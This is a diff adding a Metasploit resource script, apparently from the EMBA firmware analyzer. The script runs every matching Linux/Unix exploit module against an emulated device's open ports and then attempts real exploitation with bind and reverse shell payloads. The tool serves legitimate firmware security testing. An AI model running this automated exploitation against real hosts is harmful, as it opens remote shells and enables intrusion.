@@ -1,0 +1,232 @@
+<ruby>
+
+def help_me
+  help = %Q|
+  Description:
+    This Metasploit RC script is part of the firmware analyzer EMBA.
+    The script runs through all Metasploit modules and triggers the check function.
+    As the check functionality is not implemented in all modules we also do
+    a real exploitation attempt. This could corrupt our emulated system. This EMBA
+    module is typically used at the end of the automated analysis procedure.
+    You can also setup the emulated device afterwards manually and check the 
+    Metasploit RC script against it with the following arguments.
+
+  Usage:
+    ./msfconsole -r [rc_path] [ip_address] [list_of_ports] [arch]
+    ./msfconsole -r ./helpers/msf-check.rc 127.0.0.1 123,1337,101 mipsle
+  |
+
+  help = help.gsub(/^\t/, '')
+  print_line(help)
+end
+
+@job_ids = []
+
+def wait_until_jobs_done
+  loop do
+    @job_ids.each do |job_id|
+      current_job_ids = framework.jobs.keys.map { |e| e.to_i }
+      sleep 1 if current_job_ids.include?(job_id)
+    end
+
+    return
+  end
+end
+
+def select_payload(exploit,arch)
+  linux   = "linux/#{arch}/shell_bind_tcp"
+  php     = 'php/meterpreter/bind_tcp'
+  multi   = 'java/meterpreter/bind_tcp'
+  cmd     = 'cmd/unix/interact'
+  # generic = 'generic/shell_bind_tcp'
+  generic = 'generic/shell_reverse_tcp'
+
+  payloads = []
+  exploit.compatible_payloads.each do |p|
+    payloads << p[0]
+  end
+
+  if payloads.include?(linux)
+    return linux
+  elsif payloads.include?(php)
+    return php
+  elsif payloads.include?(multi)
+    return multi
+  elsif payloads.include?(cmd)
+    return cmd
+  elsif payloads.include?(generic)
+    return generic
+  else
+    # WTF? This exploit supports NONE of our favorite payloads?
+    # What kinda BS is this? We return a linux payload:
+    return linux
+  end
+end
+
+def exploit_checker(host,ports,architecture)
+  print_status("Checking host #{host} with identified ports #{ports}...")
+  framework.exploits.each { |name,mod|
+    mod = framework.modules.create("#{name}")
+
+    if mod.nil?
+      print_line("Unable to load #{name}")
+      next
+    end
+
+    # remove modules that we won't check:
+    next if (name =~ /local/ or
+             name =~ /fileformat/ or
+             name =~ /browser/)
+    # only test modules from the following categories:
+    next if not (name =~ /linux/ or
+                 name =~ /multi/ or
+                 name =~ /freebsd/ or
+                 name =~ /unix/ or
+                 name =~ /openbsd/)
+    # remove modules with issues - we need to check them again and adjust the settings:
+    next if (name =~ /cve_2020_13160_anydesk/ or
+             name =~ /goahead_ldpreload/ or
+             name =~ /phpmailer_arg_injection/ or
+             name =~ /atutor_filemanager_traversal/)
+
+    ports.split(",").each { |serv|
+      # we test only matching ports - default RPORT of module matches
+      # open port we identified in emulation phase
+      next if (mod.datastore['RPORT'].to_s != serv.to_s)
+
+      mod.datastore['VERBOSE'] = "true"
+      mod.datastore['RHOSTS'] = host.to_s
+      mod.datastore['SRVHOST'] = Rex::Socket.source_address("#{host.to_s}") 
+
+      if architecture == "mipsbe"
+        # mipsle is mostly target 1
+        mod.datastore['TARGET'] = 1
+      end
+      if architecture == "mipsle"
+        # mipsle is mostly target 0
+        mod.datastore['TARGET'] = 0
+      end
+
+      print_status("Checking #{name} against host #{host.to_s}:#{serv} ...")
+      begin
+        # Vuln check:
+        result = mod.check_simple({'RunAsJob': true, 'LocalOutput': self.output})
+
+        if mod.job_id
+          print_status("Check #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
+          @job_ids << mod.job_id
+        end
+
+        if not result.nil?
+          print_status("Check code for #{name}: #{result.to_s}")
+        end
+
+        if (result =~ /Vulnerable/ or result =~ /Appears/)
+          print_good("Vulnerability identified for module #{name} - #{host.to_s}:#{serv}")
+          print_good("Check state #{result} for module #{name} - #{host.to_s}:#{serv}")
+        end
+
+        if (result.to_s =~ /safe/)
+          print_status("Check code is safe - skipping exploitation attempt for #{name}")
+          next
+        end
+      rescue ::Exception => e
+        print_error(e.message)
+      end
+
+      print_status("Exploiting #{name} against host #{host.to_s}:#{serv} ...")
+      get_payload = select_payload(mod,architecture)
+      mod.datastore['RHOST'] = host.to_s
+
+      if get_payload.nil?
+        print_error("No payload selected for this exploit: #{name}")
+      else
+        print_status("Payload selected: #{get_payload}")
+      end
+
+      begin
+        lport_setting = rand(4000..40_862).to_s
+        mod.datastore['LPORT'] = lport_setting
+        if get_payload.to_s =~ /reverse/
+          mod.datastore['LHOST'] = Rex::Socket.source_address("#{host.to_s}") 
+        end
+        mod.datastore['PAYLOAD'] = get_payload.to_s
+
+        # Exploitation:
+        result = mod.exploit_simple({'RunAsJob': true, 'LocalOutput': self.output})
+
+        # looks like the job handling does not work as expected - mod.job_id is empty
+        if mod.job_id
+          print_status("Exploit #{name} job ID for target #{host.to_s} is: #{mod.job_id}")
+          @job_ids << mod.job_id
+        end
+        if (result.to_s =~ /Sessions/)
+          print_good("Vulnerability identified for module #{name} - #{host.to_s}:#{serv}")
+          print_good("Session state #{result} for module #{name} - #{host.to_s}:#{serv}")
+        end
+      rescue ::Exception => e
+        print_error(e.message)
+      end
+    }
+  }
+  print_status("All exploits sent to #{host} ... lets wait a few seconds")
+  wait_until_jobs_done
+end
+
+
+#
+# Initialize our arguments
+#
+def init_args
+  args = {}
+  if ARGV.join('') =~ /^help$/i
+    args[:help] = true
+    return args
+  end
+
+  datastore        = framework.datastore
+  args[:host]      = ARGV.shift || ''
+  args[:ports]     = ARGV.shift || ''
+  args[:architecture]      = ARGV.shift || ''
+
+  raise ArgumentError, "Missing a host ip address" if args[:host].empty?
+  raise ArgumentError, "Missing port list" if args[:ports].empty?
+
+  print_status("Ports: #{args[:ports]}")
+  print_status("Host: #{args[:host]}")
+  print_status("ARCH: #{args[:architecture]}")
+
+  return args
+end
+
+
+#
+# main
+#
+print_status("Starting Metasploit analysis ...")
+begin
+  args = init_args
+  if args[:help]
+    help_me
+    return
+  end
+
+  exploit_checker(args[:host],args[:ports],args[:architecture])
+  # future extension:
+  # auxiliary_checker(args[:host],args[:ports],args[:arch])
+rescue ArgumentError => e
+  print_error("Invalid argument: #{e.message}")
+  return
+end
+
+# we give the exploit another 30 seconds before we exit Metasploit the hard way
+sleep 30
+print_status("The autoexploitation attempt has completed with #{framework.sessions.length} sessions")
+unless framework.sessions.empty?
+  run_single("sessions -v")
+end
+
+run_single("jobs -K")
+run_single("exit -y")
+
+</ruby>
